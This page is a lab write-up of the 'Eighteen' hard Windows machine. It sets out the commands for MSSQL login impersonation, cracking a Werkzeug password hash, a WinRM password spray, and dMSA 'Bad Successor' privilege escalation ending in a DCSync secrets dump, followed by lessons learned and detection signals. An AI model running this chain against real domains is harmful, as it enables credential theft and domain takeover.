---
layout: default
title: "Eighteen"
parent: Hard Machines
grand_parent: Machines
permalink: /machines/hard/eighteen/
---

# Eighteen

![Machine Badge](https://img.shields.io/badge/Machine-Eighteen-blue)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-orange)

| Property | Value |
|----------|-------|
| **OS** | Windows Server 2025 |
| **Difficulty** | Hard |
| **Release** | 2026-04-11 |
| **Tags** | #windows-server-2025 #assume-breach #mssql-impersonation #bad-successor #dmsa #cve-2025-53779 #werkzeug-pbkdf2 #winrm |

---

## Summary

Eighteen is a **Windows Server 2025 assume-breach** scenario starting with valid MSSQL credentials. The attack uses **MSSQL login impersonation** (`EXECUTE AS LOGIN`) to access a `FinancePlanner` database where the web admin's password is stored as a **Werkzeug PBKDF2-SHA256** hash. The cracked password sprays positively against another domain user with **WinRM** rights. Privilege escalation abuses the **"Bad Successor"** (**CVE-2025-53779**) vulnerability - a flaw in **delegated Managed Service Account (dMSA)** migration on Windows Server 2025 that allows forging keys to impersonate Domain Admin.

---

## External Writeups

- [0xdf - HTB Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)

---

## Key Techniques

- MSSQL `EXECUTE AS LOGIN` impersonation (`sysadmin` or `IMPERSONATE` privilege)
- Werkzeug PBKDF2-SHA256 hash format recognition + `hashcat -m 10900`
- Password spray with NXC / kerbrute targeting WinRM (port 5985)
- **CVE-2025-53779** "Bad Successor" - dMSA migration key forgery (Windows Server 2025)
- dMSA inheritance / msDS-DelegatedMSAState abuse
- Pure Kerberos lateral movement

---

## Attack Path

### 1. Recon & Assumed Breach Entry

Given creds: `eighteen.htb\<user>:<pw>` and MSSQL access to `dc01.eighteen.htb:1433`.

```bash
impacket-mssqlclient eighteen.htb/<user>:'<pw>'@dc01.eighteen.htb -windows-auth
```

### 2. MSSQL Login Impersonation

Enumerate impersonatable logins:

```sql
SELECT name, type_desc FROM sys.server_principals;
SELECT b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
-- -> sa, finance_app
EXECUTE AS LOGIN = 'finance_app';
SELECT SYSTEM_USER;
```

Switch DB:

```sql
USE FinancePlanner;
SELECT username, password_hash FROM admins;
-- admin : pbkdf2:sha256:600000$<salt>$<hash>
```

### 3. Werkzeug Hash Crack

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
# admin : <password>
```

### 4. Password Spray to WinRM

```bash
nxc winrm dc01.eighteen.htb -u users.txt -p '<password>' --continue-on-success
# Hit: eighteen.htb\<user2> : <password>
evil-winrm -i dc01.eighteen.htb -u <user2> -p '<password>'
```

### 5. CVE-2025-53779 - Bad Successor (dMSA Migration)

On Windows Server 2025, the **dMSA** (delegated MSA) migration flow has a logic flaw: an attacker with **CreateChild** rights on an OU (or specific ACLs over a dMSA object) can:

1. Create or modify a dMSA pointing to a privileged predecessor
2. Trigger a migration sequence that forges the new dMSA's keys based on the predecessor's identity
3. The KDC then issues TGTs honoring the **predecessor's** group memberships - including Domain Admins

```powershell
# Verify ACL position
Get-ACL "AD:CN=dmsa1,CN=Managed Service Accounts,DC=eighteen,DC=htb" | fl
# Trigger migration / set msDS-DelegatedMSAState
Set-ADComputer dmsa1 -Replace @{ "msDS-DelegatedMSAState" = 2 }
# Request TGT for the dMSA - inherits predecessor's PAC
Rubeus.exe asktgt /user:dmsa1$ /aes256:<key> /domain:eighteen.htb /dc:dc01.eighteen.htb /ptt
```

With Domain Admin PAC, run DCSync:

```bash
impacket-secretsdump eighteen.htb/dmsa1\$@dc01.eighteen.htb -k -no-pass
```

---

## Lessons Learned

- **Windows Server 2025 dMSA** is a brand-new attack surface; "Bad Successor" turned a migration feature into a credential-forgery primitive within months of GA.
- **MSSQL `IMPERSONATE` permissions** are routinely over-granted - always enumerate `sys.server_permissions` post-foothold.
- **Werkzeug** is recognisable by the `pbkdf2:sha256:<iter>$<salt>$<hash>` literal prefix - hashcat `-m 10900`.
- Password reuse across DB and AD remains the #1 pivot vector in 2026.

---

## Detection

- KDC events 4768 / 4769 for newly-created dMSA accounts with privileged group SIDs in the PAC.
- LDAP modifications to `msDS-DelegatedMSAState`, `msDS-ManagedAccountPrecededByLink`, `msDS-GroupMSAMembership`.
- MSSQL audit: `EXECUTE AS LOGIN` calls followed by sensitive table reads.
